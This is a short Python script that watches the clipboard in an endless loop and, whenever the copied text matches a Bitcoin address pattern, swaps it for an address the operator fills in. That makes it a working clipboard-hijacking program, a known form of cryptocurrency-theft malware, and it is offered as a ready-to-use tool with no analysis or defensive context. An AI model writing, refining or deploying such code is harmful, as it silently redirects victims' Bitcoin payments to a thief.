# encoding: utf-8
import pyperclip
import re
target_bc_address = "Here goes your address"  # example = 1JUAFcM3Y3gr2ZE2X6aQnD7WjMvucSxsXg

runpls=True

while runpls:
    clipboard = pyperclip.paste()
    isbtacc = re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',clipboard)
    if (isbtacc):
        pyperclip.copy(target_bc_address)
